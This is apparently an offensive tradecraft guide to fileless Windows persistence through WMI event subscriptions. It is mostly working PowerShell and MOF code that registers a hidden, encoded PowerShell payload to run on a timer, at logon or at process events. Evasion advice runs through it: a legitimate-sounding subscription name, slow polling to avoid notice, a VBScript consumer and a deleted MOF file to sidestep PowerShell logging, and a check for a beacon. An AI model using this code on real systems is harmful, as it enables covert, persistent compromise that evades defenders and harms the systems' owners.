# WMI event subscription persistence

Establishing fileless, reboot-persistent execution via Windows Management
Instrumentation event subscriptions. WMI subscriptions do not create scheduled
tasks and do not appear in the Task Scheduler UI, making them harder to discover
through standard administrative tools.

## How WMI persistence works

Three objects are needed:

- `__EventFilter`: defines the condition that triggers execution (a WMI query)
- `CommandLineEventConsumer` (or `ActiveScriptEventConsumer`): defines what to execute
- `__FilterToConsumerBinding`: links the filter to the consumer

All three are stored in the `root\subscription` WMI namespace and survive reboots.
The WMI service (`winmgmt`) loads them automatically on startup.

## Audit before creating

```powershell
# list existing event subscriptions before creating anything
Get-WMIObject -Namespace root\subscription -Class __EventFilter |
  Select-Object Name, Query | Format-Table -AutoSize

Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer |
  Select-Object Name, CommandLineTemplate | Format-Table -AutoSize

Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding |
  Select-Object Filter, Consumer | Format-Table -AutoSize
```

Note the names already in use. Pick a name that fits the existing pattern; on
most systems there will be a handful of legitimate subscriptions from endpoint
protection or management software.

## Create WMI persistence (PowerShell)

```powershell
# filter: fires every 10 minutes based on a performance counter modification event
$filterArgs = @{
    Name           = 'WindowsSecurityHealth'
    EventNamespace = 'root\cimv2'
    QueryLanguage  = 'WQL'
    Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 600
                      WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Class __EventFilter `
    -Namespace 'root\subscription' `
    -Arguments $filterArgs

# consumer: command to execute when filter fires
$consumerArgs = @{
    Name                = 'WindowsSecurityHealth'
    CommandLineTemplate = 'powershell.exe -w hidden -nop -enc BASE64PAYLOAD'
}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer `
    -Namespace 'root\subscription' `
    -Arguments $consumerArgs

# binding: connects filter to consumer
Set-WmiInstance -Class __FilterToConsumerBinding `
    -Namespace 'root\subscription' `
    -Arguments @{ Filter = $filter; Consumer = $consumer }
```

The `WITHIN 600` clause polls every 600 seconds (10 minutes). Values below 60
generate excessive WMI activity that may be noticed.

## Alternative triggers

| Trigger query | Fires on | Notes |
| ------------- | -------- | ----- |
| `__InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'` | Every N seconds (polling) | Most common; reliable |
| `__InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'` | User logon | Fires on every interactive logon |
| `__InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'` | Specific process exit | Useful for blending into normal activity |
| `__InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_ProcessStartTrace' AND TargetInstance.ProcessName = 'explorer.exe'` | Explorer start (desktop logon) | Workstations only |

## Script consumer (VBScript, avoids PowerShell telemetry)

```powershell
$consumerArgs = @{
    Name             = 'WindowsSecurityHealth'
    ScriptingEngine  = 'VBScript'
    ScriptText       = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c powershell.exe -w hidden -nop -enc BASE64PAYLOAD", 0, False
'@
}
$consumer = Set-WmiInstance -Class ActiveScriptEventConsumer `
    -Namespace 'root\subscription' `
    -Arguments $consumerArgs
```

`ActiveScriptEventConsumer` uses the legacy scripting engine rather than
PowerShell directly. The PowerShell process is still spawned as a child of
WMI, but the parent is `scrcons.exe` rather than a WMI service process.

## MOF-based creation (avoids PowerShell WMI cmdlets)

Managed Object Format files can register WMI objects without using PowerShell
cmdlets, reducing telemetry from PowerShell script block logging:

```text
# create a .mof file and compile it with mofcomp.exe
# the file is consumed and deleted after compilation

# wsh-persist.mof
#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as $filter
{
    Name = "WindowsSecurityHealth";
    EventNamespace = "root\\cimv2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 600 "
            "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
};

instance of CommandLineEventConsumer as $consumer
{
    Name = "WindowsSecurityHealth";
    CommandLineTemplate = "powershell.exe -w hidden -nop -enc BASE64PAYLOAD";
};

instance of __FilterToConsumerBinding
{
    Filter = $filter;
    Consumer = $consumer;
};
```

```text
mofcomp.exe wsh-persist.mof
```

After compilation the `.mof` file can be deleted; the subscription is stored
in the WMI repository and survives without the source file.

## Verify

```powershell
# confirm all three objects exist
Get-WMIObject -Namespace root\subscription -Class __EventFilter |
  Where-Object { $_.Name -eq 'WindowsSecurityHealth' }

Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer |
  Where-Object { $_.Name -eq 'WindowsSecurityHealth' }

Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding

# force the filter to fire immediately for testing (modify the trigger temporarily)
# or wait for the polling interval to elapse and check for the beacon
```

## Remove

```powershell
# remove all three objects to clean up
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding |
  Where-Object { $_.Filter -like '*WindowsSecurityHealth*' } |
  Remove-WmiObject

Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer |
  Where-Object { $_.Name -eq 'WindowsSecurityHealth' } |
  Remove-WmiObject

Get-WMIObject -Namespace root\subscription -Class __EventFilter |
  Where-Object { $_.Name -eq 'WindowsSecurityHealth' } |
  Remove-WmiObject
```

Remove the binding first. Leaving the filter and consumer with no binding is
safe; removing the filter first can cause WMI service errors if the binding
still references it.
